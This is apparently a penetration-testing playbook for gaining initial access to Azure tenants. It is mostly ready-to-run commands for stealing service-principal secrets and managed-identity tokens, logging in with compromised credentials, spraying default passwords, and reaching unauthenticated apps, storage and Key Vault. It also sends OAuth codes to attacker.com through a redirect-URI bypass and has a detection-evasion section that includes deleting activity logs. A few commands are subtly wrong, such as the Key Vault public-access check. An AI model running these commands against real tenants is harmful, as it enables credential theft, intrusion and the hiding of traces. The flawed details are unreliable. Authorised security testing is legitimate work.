# Azure Initial Access

Initial access to Azure environments typically occurs through compromised credentials, misconfigured authentication, or public exposure of resources.

## Credential-Based Access

### Obtaining Credentials

#### User Password Compromise
- Phishing attacks targeting Azure AD users
- Password spraying against common usernames
- Leaked credentials from external breaches
- Default credentials in documentation

#### Service Principal Credential Theft
```bash
# Service principal client secret exposure in code
grep -r "AZURE_CLIENT_SECRET\|azure_client_secret" . --include="*.py" --include="*.js"

# Check git history for exposed secrets
git log --all --full-history --source -- "*secrets*" "*config*"

# Environment variable exposure in running containers
kubectl exec -it {pod} -- env | grep -i azure

# Function app configuration
az functionapp config appsettings list --name {functionAppName} --resource-group {rg}

# Deployed app configuration
az webapp config appsettings list --name {appName} --resource-group {rg}
```

#### System-Assigned Managed Identity Token
```bash
# From compromised VM
curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/ \
  -H "Metadata: true" | jq .

# From App Service
curl -s http://localhost:8081/MSI/token/Azure/?resource=https://management.azure.com \
  -H "Metadata: true" | jq .

# From Kubernetes pod with workload identity
kubectl describe pod {pod} -n {namespace} | grep -i azure
```

### Using Obtained Credentials

```bash
# Login with compromised user
az login --username user@company.com --password '{password}'

# Authenticate as service principal
az login --service-principal \
  --username {clientId} \
  --password {clientSecret} \
  --tenant {tenantId}

# Use managed identity token
TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-12-01&resource=https://management.azure.com/ -H "Metadata: true" | jq -r '.access_token')
az rest --url https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups?api-version=2021-04-01 \
  --headers "Authorization: Bearer $TOKEN"

# Access Microsoft Graph API
curl -s https://graph.microsoft.com/v1.0/me \
  -H "Authorization: Bearer $TOKEN" | jq .
```

## Misconfigured Authentication

### Public App Service Exposure

```bash
# Identify publicly accessible app services
for app in $(az webapp list --query '[].name' -o tsv); do
  rg=$(az webapp list --query "[?name=='$app'].resourceGroup" -o tsv)
  url=$(az webapp show --name $app --resource-group $rg --query 'defaultHostName' -o tsv)
  curl -s -I "https://$url" | head -1
done

# Check if authentication is enforced
curl -s "https://{app}.azurewebsites.net/admin" -I

# Access authenticated endpoints without credentials
curl -s "https://{app}.azurewebsites.net/api/users"
```

### Disabled Authentication

```bash
# Check app authentication settings
az webapp auth show --name {appName} --resource-group {rg}

# If auth is disabled, direct API access possible
curl -s "https://{app}.azurewebsites.net/api/admin/users" | jq .
```

### OAuth/OIDC Misconfiguration

```bash
# Identify OIDC providers
curl -s "https://company.azurewebsites.net/.well-known/openid-configuration" | jq .

# Redirect URI validation bypass
# Normal flow:
# 1. Attacker sends: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
#    client_id={app_client_id}&redirect_uri=https://attacker.com
# 2. If accepted, user redirects to attacker with authorization code

# Extract auth code and exchange for token
AUTH_CODE=$1
curl -s https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token \
  -d "client_id={clientId}&client_secret={clientSecret}&code=$AUTH_CODE&redirect_uri=https://attacker.com&grant_type=authorization_code"
```

## Resource Exposure

### Storage Account Public Access

```bash
# Find publicly accessible storage
for account in $(az storage account list --query '[].name' -o tsv); do
  for container in $(az storage container list --account-name "$account" --query '[].name' -o tsv 2>/dev/null); do
    level=$(az storage container show --name "$container" --account-name "$account" --query 'properties.publicAccess' -o tsv 2>/dev/null)
    [ "$level" != "None" ] && echo "PUBLIC: $account/$container ($level)"
  done
done

# Direct access without credentials
curl -s "https://{account}.blob.core.windows.net/{container}/{blob}"
```

### Overshared SAS Tokens

```bash
# Search for exposed SAS URLs
grep -r "?sv=\|blob.core.windows.net" . --include="*.md" --include="*.txt" --include="*.json"

# Use SAS token
curl -s "https://{account}.blob.core.windows.net/{container}/{blob}?{sas_token}"
```

### Key Vault Public Access

```bash
# Check if Key Vault allows public access
az keyvault show --name {vaultName} --query 'properties.enabledForDeployment'

# Attempt secret access
az keyvault secret show --vault-name {vaultName} --name {secretName}

# If firewall rules exist but source IP is allowed
# VPN/Proxy to allowed IP range
```

## Application-Specific Entry Points

### Default Credentials

```bash
# Common default accounts
- admin/admin
- administrator/password
- sa/{random}

# Check for default credentials in Azure resources
for user in admin administrator root sa; do
  az login --username "$user@company.com" --password "Password123!"
done
```

### API Key Exposure

```bash
# Search for API keys in accessible locations
curl -s https://company.azurewebsites.net/config.json | jq .

# Check GitHub repositories
curl -s https://api.github.com/search/code?q=org:company+azure_key | jq '.items[] | .html_url'

# Check public storage for config files
find . -name "*.config" -o -name "appsettings.json" -o -name ".env" | xargs grep -l "key\|secret"
```

## Exploitation

Once credentials are obtained or public access is confirmed:

```bash
# Get current identity
az account show

# Check accessible subscriptions
az account list

# List accessible resources
az resource list

# Attempt privilege escalation (see privilege-escalation.md)
```

## Detection Evasion

```bash
# Use existing tools instead of installing new ones
az ad user list  # Rather than third-party enumeration tools

# Blend with legitimate traffic patterns
# Spread queries across hours/days

# Use legitimate Azure tools
# PowerShell with -NoProfile to avoid logging

# Delete activity logs if possible (after gaining sufficient privileges)
az monitor log-profiles list
```

## Key Findings to Report

- Any publicly accessible resources containing sensitive data
- Service principals with excessive permissions
- Disabled authentication on sensitive endpoints
- Exposed SAS tokens or connection strings
- Overpermissioned user accounts
- Unencrypted data at rest
